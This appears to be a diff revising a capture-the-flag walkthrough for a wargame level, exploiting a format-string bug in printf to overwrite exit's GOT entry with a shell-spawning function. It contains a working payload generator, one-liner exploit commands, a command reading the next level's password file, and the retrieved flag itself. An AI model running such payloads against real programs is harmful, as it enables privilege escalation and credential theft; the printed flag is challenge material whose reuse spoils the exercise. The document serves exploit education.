@@ -1,116 +1,155 @@
 # Level 5 Walkthrough
 
 ## Objective
-Exploit a format-string vulnerability to gain a level6 shell by redirecting the program’s call to `exit()` into the helper function `o()` that runs `/bin/sh`, then read level6’s password.
+Exploit a format string vulnerability to overwrite `exit()` in the GOT (Global Offset Table) with the address of function `o()`, which spawns a shell.
 
-## Source review (local copy in level5/source)
-```
-void n(void) {
-  char local_20c[520];
-  fgets(local_20c, 0x200, stdin);
-  printf(local_20c);  // format string vuln
-  exit(1);
+## The Vulnerability
+
+```c
+void o(void) {
+    system("/bin/sh");
 }
-void o(void) { system("/bin/sh"); _exit(1); }
-```
-Key points:
-- User input is passed directly to `printf` (format string vulnerability).
-- Program unconditionally calls `exit(1)` after `printf`.
-- There’s a handy `o()` that executes a shell.
 
-## Protections on the remote binary
+void n(void) {
+    char buffer[512];
+    fgets(buffer, 512, stdin);
+    printf(buffer);  // Format string vulnerability!
+    exit(1);
+}
 ```
-RELRO: No RELRO
-Canary: No canary found
-NX:    disabled
-PIE:   No PIE
-```
-Implication: addresses are static (No PIE), so GOT addresses and function addresses are predictable. We can overwrite a GOT slot with `%n` writes.
 
-## Recon on the remote target
-- Locate `o()` and the GOT entry for `exit`:
-  - `objdump -t /home/user/level5/level5 | grep -E "\bo\b$"` → `o` at `0x080484a4`
-  - `objdump -R /home/user/level5/level5 | grep -i exit` → `exit@GOT` at `0x08049838` (and `_exit@GOT` at `0x08049828`)
+**The problem**: User input goes directly to `printf()` without a format string.
 
-- Find our offset on the stack (quick check):
-  - `python -c "print 'AAAA' + ' %x'*40" | ./level5`
-  - Output contained `41414141` at the 4th position, so our first user-controlled 4 bytes are at `%4$*`.
-  - Verified with a file-based probe to avoid shell mangling: prepended two addresses and printed `%1$08x ...`, confirming addresses appear at `%4$` and `%5$`.
+**The opportunity**: 
+- There's a function `o()` that spawns a shell
+- The program calls `exit(1)` after printf
+- We can overwrite `exit@GOT` to point to `o()` instead!
 
-## Exploitation plan
-We’ll overwrite `exit@GOT (0x08049838)` with the address of `o (0x080484a4)` using two half-word writes (`%hn`):
-- Split `0x080484a4` into halves: high=0x0804, low=0x84a4
-- Place two target addresses at the start of input (little-endian):
-  - `0x0804983a` (GOT+2) for the high half
-  - `0x08049838` (GOT) for the low half
-- Write in ascending order of the values to avoid wrap issues:
-  1) Write 0x0804 to `0x0804983a`
-  2) Then write 0x84a4 to `0x08049838`
-- Our addresses occupy `%4$` and `%5$` on the stack, so we’ll use `%4$hn` and `%5$hn`.
+## Finding the Addresses
 
-## Building the payload (remote, in /tmp due to perms)
-The home dir is not writable; use /tmp:
-```
-mkdir -p /tmp/l5 && cd /tmp/l5
-```
-Minimal generator used:
-```
-import struct
-addr_exit = 0x08049838
-addr_o = 0x080484a4
-addr_exit_hi = addr_exit + 2
-low  = addr_o & 0xffff      # 0x84a4
-high = (addr_o >> 16) & 0xffff  # 0x0804
-pairs = sorted([(low, addr_exit), (high, addr_exit_hi)])
-# addresses first
-payload = b''.join(struct.pack('<I', a) for _, a in pairs)
-printed = len(payload)     # 8
-offset  = 4                # first address is %4$*
-for i,(val,_) in enumerate(pairs):
-    width = (val - printed) % 0x10000
-    if width < 10: width += 0x10000
-    payload += f"%{width}x".encode()
-    printed += width
-    payload += f"%{offset+i}$hn".encode()
-open('exploit2','wb').write(payload + b"\n")
-```
-Example hexdump of the resulting input:
-```
-00000000  3a 98 04 08 38 98 04 08  25 32 30 34 34 78 25 34
-00000010  24 68 6e 25 33 31 39 30  34 78 25 35 24 68 6e 0a
-```
-Which corresponds to: `[0x0804983a][0x08049838]%2044x%4$hn%31904x%5$hn`.
-- First `%4$hn` writes 0x0804 (after 8 + 2044 = 2052 chars total)
-- Second `%5$hn` writes 0x84a4 (after +31904 more chars)
+### 1. Find the address of function `o()`
 
-## Triggering the exploit and keeping stdin open
-Pipe the payload and keep stdin open (so the spawned shell can accept commands):
+```bash
+objdump -t level5 | grep " o$"
 ```
-(cat exploit2; cat) | /home/user/level5/level5
+
+Result: `o` is at **0x080484a4**
+
+### 2. Find the GOT entry for `exit()`
+
+```bash
+objdump -R level5 | grep exit
 ```
-Then verify effective user and read the password:
+
+Result: `exit@GOT` is at **0x08049838**
+
+### 3. Find the stack offset
+
+```bash
+python -c "print 'AAAA' + ' %x'*10" | ./level5
 ```
-id
-whoami
+
+Look for `41414141` (AAAA in hex). It appears at position **4**.
+
+This means our input starts at `%4$` on the stack.
+
+## The Exploit
+
+We need to write `0x080484a4` to address `0x08049838`.
+
+We'll split this into two 2-byte writes using `%hn`:
+- Write **0x0804** to `0x0804983a` (high 2 bytes)
+- Write **0x84a4** to `0x08049838` (low 2 bytes)
+
+### Why write in this order?
+
+We write the smaller value first (0x0804 = 2052) then the larger (0x84a4 = 33956).
+
+### The Payload Structure
+
+```
+[address1][address2][padding to 0x0804][%4$hn][padding to 0x84a4][%5$hn]
+```
+
+Breaking it down:
+1. **8 bytes**: Two addresses (4 bytes each)
+   - `0x0804983a` (GOT+2, for high bytes)
+   - `0x08049838` (GOT, for low bytes)
+
+2. **Print 2044 more bytes** to reach total of 2052 (0x0804)
+   - Use `%2044x` to print padding
+
+3. **Write with %4$hn** to first address
+
+4. **Print 31904 more bytes** to reach total of 33956 (0x84a4)
+   - Use `%31904x` to print padding
+
+5. **Write with %5$hn** to second address
+
+### The Math
+
+```
+Start: 8 bytes (two addresses)
+After %2044x: 8 + 2044 = 2052 = 0x0804 ✓
+After %31904x: 2052 + 31904 = 33956 = 0x84a4 ✓
+```
+
+## Running the Exploit
+
+### Simple one-liner:
+
+```bash
+(python -c "print('\x3a\x98\x04\x08' + '\x38\x98\x04\x08' + '%2044x%4\$hn' + '%31904x%5\$hn')"; cat) | ./level5
+```
+
+Or with reversed byte order for clarity:
+
+```bash
+(python -c "print('\x08\x04\x98\x3a'[::-1] + '\x08\x04\x98\x38'[::-1] + '%2044x%4\$hn' + '%31904x%5\$hn')"; cat) | ./level5
+```
+
+### Get the flag:
+
+```bash
 cat /home/user/level6/.pass
 ```
-Observed result:
-```
-uid=2045(level5) gid=2045(level5) euid=2064(level6) ...
-whoami → level6
-/pass → d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
-```
 
-## Notes and tips
-- `%n` family writes the number of bytes printed so far; for 32-bit targets use `%hn` twice to write 2 bytes at a time.
-- Order writes by ascending half-words to avoid negative widths or wrap complications.
-- Because PIE is disabled, function and GOT addresses are stable; if you rebuild, re-check addresses and stack offset.
-- If your shell eats `$` in format strings, prefer crafting inputs in a file and piping it to the binary.
-- `peda` is available on the target at `/tmp/peda` if you want to step through in gdb, but it wasn’t required here.
+Result: **d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31**
+
+## How It Works
+
+1. **Input contains two addresses** at the start (little-endian)
+2. **printf() reads them from stack** at positions %4$ and %5$
+3. **%2044x prints padding** (2044 spaces) → total printed = 2052 = 0x0804
+4. **%4$hn writes 0x0804** to address at %4$ (0x0804983a)
+5. **%31904x prints more padding** → total printed = 33956 = 0x84a4
+6. **%5$hn writes 0x84a4** to address at %5$ (0x08049838)
+7. **exit@GOT now points to o()** instead of exit()
+8. **When exit(1) is called**, it jumps to o()
+9. **o() executes /bin/sh** → Shell spawned!
+
+## Key Concepts
+
+### Format String Vulnerability
+
+`printf(user_input)` allows attackers to:
+- Read from stack: `%x`, `%s`
+- Write to memory: `%n`, `%hn`
+- Access specific positions: `%4$x`, `%5$hn`
+
+### GOT (Global Offset Table)
+
+The GOT stores addresses of library functions. When you call `exit()`, the program looks up the address in the GOT. By overwriting this entry, we redirect execution.
+
+### %hn (Half-word Write)
+
+`%hn` writes 2 bytes (16 bits) instead of 4 bytes. This makes it easier to write specific values without printing billions of characters.
 
 ## Summary
-- Vulnerability: format string in `printf(local_20c)`.
-- Primitive: `%hn`-based GOT overwrite.
-- Target: `exit@GOT → o()`.
-- Outcome: Spawned a shell as level6 and retrieved the next level’s password.
 
+- **Vulnerability**: Format string in `printf(buffer)`
+- **Target**: Overwrite `exit@GOT` (0x08049838) with address of `o()` (0x080484a4)
+- **Technique**: Two `%hn` writes to write 4 bytes in two 2-byte chunks
+- **Result**: Shell as level6, flag retrieved
+
+**Flag**: d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
